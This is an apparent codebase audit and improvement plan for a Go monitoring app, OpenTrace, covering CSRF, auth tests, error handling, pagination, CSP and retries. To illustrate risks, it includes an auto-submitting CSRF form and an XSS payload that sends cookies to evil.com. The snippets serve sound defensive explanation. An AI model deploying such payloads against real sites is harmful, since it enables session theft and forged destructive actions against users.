# OpenTrace Improvement Plan

> Findings from a full codebase audit. Work through items by priority.
> Check off each item as completed.

---

## High Priority

### 1. [x] Add CSRF Protection

**What it is:** Cross-Site Request Forgery is when a malicious website tricks your browser into making requests to OpenTrace while you're logged in. Because your session cookie is sent automatically, OpenTrace can't tell the difference between a real click and a forged one.

**Example attack:**
You're logged in to OpenTrace. You visit a random blog that has this hidden form:
```html
<form action="https://your-opentrace.com/api/connectors/prod-db/delete" method="POST">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```
Your browser sends the request with your session cookie — OpenTrace thinks you clicked "Delete" and removes your production database connector.

**What we need to do:**
- Add middleware that generates a random token per session
- Include that token in every HTML form as a hidden field
- Reject any POST/PUT/DELETE that doesn't include a valid token
- API calls using Bearer tokens (MCP, API key) are already safe — they don't use cookies

**Files to change:**
- `internal/web/middleware.go` — new CSRF middleware
- `internal/web/server.go` — register middleware on routes
- All HTML templates — add `<input type="hidden" name="_csrf" value="...">` to forms

**Effort:** ~2 hours

---

### 2. [x] Add Tests for Auth Handlers

**What it is:** The authentication code (`auth_handlers.go`, 516 lines) handles login, registration, password changes, account lockout, and session management — but has zero tests. If someone refactors this code and accidentally breaks the lockout logic, nothing catches it.

**What could go wrong without tests:**
- Lockout after 5 failed logins stops working → brute force becomes possible
- Password minimum (12 chars) check gets bypassed → weak passwords allowed
- Session invalidation on password change breaks → old sessions stay active after password reset
- Timing-safe comparison removed → email enumeration via response time differences

**Tests to write:**
- Login with correct credentials → success, session created
- Login with wrong password → 401, no session
- 5 failed logins → account locked for 15 minutes
- 6th attempt during lockout → still locked, even with correct password
- Register with short password (<12 chars) → rejected
- Password change → all other sessions invalidated
- Login with disabled account → rejected
- Timing consistency: wrong-email response time ≈ wrong-password response time

**Files to create:**
- `internal/web/auth_handlers_test.go`

**Effort:** ~3 hours

---

## Medium Priority

### 3. [x] Log Silent Errors in Critical Paths

**What it is:** Several places in the code discard errors with `_ = someFunction()`. This means if something fails (database timeout, disk full, connection reset), nobody knows. The operation silently disappears.

**Specific locations:**

| File | Line | What's silenced | Risk |
|------|------|-----------------|------|
| `internal/web/server.go` | ~565 | Audit log write failure | Admin actions not recorded — compliance gap |
| `internal/web/auth_handlers.go` | ~379 | Session deletion after password change | Old sessions stay active after password reset |
| `internal/web/middleware.go` | ~28 | Old connection close on re-register | Resource leak — stale DB connections |

**What to do:**
- Replace `_ = fn()` with `if err := fn(); err != nil { slog.Warn("...", "error", err) }`
- Don't need to fail the request — just log it so operators can see the problem

**Effort:** ~30 minutes

---

### 4. [x] Add Pagination to Unbounded List Endpoints

**What it is:** Some API endpoints return ALL records with no limit. If you have 10,000 services or 50,000 event types, these endpoints dump everything into one response — slow, memory-heavy, and can crash the browser.

**Affected endpoints:**
- `GET /api/services` — returns every service name ever seen
- `GET /api/event-types` — returns every event type ever seen
- Any other list endpoint without `?limit=` and `?offset=` support

**What a user sees:**
- Dashboard loads slowly as it fetches thousands of services
- Browser tab crashes on large installations
- API responses take 5+ seconds instead of milliseconds

**What to do:**
- Add `limit` (default 100) and `offset` query parameters to each list handler
- Update the store queries to include `LIMIT ? OFFSET ?`
- Return a `total` count in the response so the UI knows how many pages exist
- Update UI components to paginate or use infinite scroll

**Files to change:**
- `internal/web/server.go` — list handlers
- Corresponding store methods
- Frontend templates/JS for pagination controls

**Effort:** ~2-3 hours

---

### 5. [x] Standardize Error Checking Patterns

**What it is:** The codebase mixes two ways of checking for "not found" errors:

```go
// Style A (fragile — breaks if error is wrapped)
if err == sql.ErrNoRows { ... }

// Style B (correct — works even if error is wrapped)
if errors.Is(err, sql.ErrNoRows) { ... }
```

Go's `errors.Is()` unwraps error chains. If someone later wraps an error with `fmt.Errorf("...: %w", err)`, Style A silently stops matching while Style B still works.

**Current inconsistencies:**
- `internal/store/error_group_store.go:54` — uses `==`
- `internal/store/log_store.go:555` — uses `==`
- `internal/store/session_store.go:53` — uses `errors.Is()` (correct)
- `internal/store/watch_store.go:143` — uses `errors.Is()` (correct)

**What to do:**
- Find all `== sql.ErrNoRows` in the store layer
- Replace with `errors.Is(err, sql.ErrNoRows)`
- Ensure store methods return `store.ErrNotFound` (not raw `sql.ErrNoRows`) so HTTP handlers only check one sentinel

**Effort:** ~30 minutes

---

### 6. [x] Tighten Content Security Policy

**What it is:** The CSP header controls what scripts/styles the browser is allowed to run. Currently, `script-src-attr 'unsafe-inline'` is set, which allows inline event handlers like `onclick="doSomething()"` in HTML. This weakens XSS protection.

**Why it matters:**
If an attacker can inject HTML (e.g., via a log message displayed in the UI), they could add:
```html
<div onmouseover="fetch('https://evil.com/steal?cookie='+document.cookie)">hover me</div>
```
With `'unsafe-inline'` allowed for script attributes, the browser executes this.

**What to do:**
- Audit templates for inline event handlers (`onclick`, `onchange`, `onsubmit`, etc.)
- Replace them with `addEventListener()` in JS files (which are already nonce-protected)
- Remove `'unsafe-inline'` from `script-src-attr` in the CSP header

**File to change:**
- `internal/web/middleware.go:53`
- HTML templates that use inline handlers

**Effort:** ~2-3 hours (depends on how many inline handlers exist)

---

## Lower Priority

### 7. [ ] Add Prometheus Metrics

**What it is:** OpenTrace monitors other systems but doesn't expose metrics about itself. There's no way to answer: "How many requests/sec is OpenTrace handling? What's the p99 latency? How many SQLite queries are slow?"

**What to expose:**
- `http_requests_total{method, path, status}` — request counter
- `http_request_duration_seconds{method, path}` — latency histogram
- `sqlite_query_duration_seconds{operation}` — database performance
- `watcher_evaluations_total{result}` — alert evaluation counts
- `healthcheck_runs_total{status}` — uptime check results
- `mcp_tool_calls_total{tool}` — MCP usage tracking

**What to do:**
- Add `prometheus/client_golang` dependency
- Create metrics middleware for HTTP request tracking
- Add `/metrics` endpoint (protected, admin-only)
- Instrument key code paths (store operations, watcher runs, health checks)

**Effort:** ~4-5 hours

---

### 8. [ ] Add OpenAPI / Swagger Documentation

**What it is:** The REST API has no machine-readable documentation. Developers integrating with OpenTrace have to read Go source code to understand endpoints, parameters, and response shapes.

**What to do:**
- Add OpenAPI 3.0 spec (can be generated from handler comments using `swaggo/swag`)
- Serve Swagger UI at `/api/docs`
- Document request/response schemas, auth requirements, error formats

**Effort:** ~4-6 hours

---

### 9. [x] Add Retry Logic for Transient Failures

**What it is:** When a webhook notification fails (network blip) or a database query times out (momentary lock contention), the operation fails permanently. There's no retry.

**Where retries would help:**
- Webhook notifications (`internal/watcher/watch_notify.go`) — a 503 from Slack shouldn't lose the alert
- Health check runs (`internal/healthcheck/checker.go`) — a single timeout shouldn't mark a service as down
- Connector queries (`internal/connector/database.go`) — transient connection resets

**What to do:**
- Add a small retry helper with exponential backoff (1s, 2s, 4s)
- Apply to idempotent operations only (reads, webhook POSTs)
- Make max retries configurable
- Never retry non-idempotent writes

**Effort:** ~2-3 hours

---

### 10. [x] Prevent Audit Entry Loss Under Load

**What it is:** The audit worker uses a buffered channel. If the channel fills up (system under heavy load, database slow), new audit entries are silently dropped rather than blocking the request.

**Current behavior:**
```
User deletes a connector → audit("delete connector") → channel full → entry dropped → no record of deletion
```

**Options:**
- **Option A:** Increase buffer size (cheap, reduces probability but doesn't eliminate it)
- **Option B:** Write to a WAL-style file when channel is full, replay on drain (durable)
- **Option C:** Log a warning when dropping, so operators know entries were lost

**Recommendation:** Start with Option C (log the drop) — it's 2 lines of code and makes the problem visible. Upgrade to Option B only if audit completeness is a compliance requirement.

**Effort:** Option C: ~15 minutes | Option B: ~3-4 hours

---

## Progress Tracker

| # | Item | Priority | Status | Completed |
|---|------|----------|--------|-----------|
| 1 | CSRF protection | High | Done | 2026-02-25 |
| 2 | Auth handler tests | High | Done | 2026-02-25 |
| 3 | Log silent errors | Medium | Done | 2026-02-25 |
| 4 | Pagination on list endpoints | Medium | Done | 2026-02-25 |
| 5 | Standardize error patterns | Medium | Done | 2026-02-25 |
| 6 | Tighten CSP | Medium | Done | 2026-02-25 |
| 7 | Prometheus metrics | Lower | Not Started | |
| 8 | OpenAPI documentation | Lower | Not Started | |
| 9 | Retry logic | Lower | Done | 2026-02-25 |
| 10 | Audit entry loss prevention | Lower | Done (Option C) | 2026-02-25 |

**Estimated total effort:** ~20-25 hours
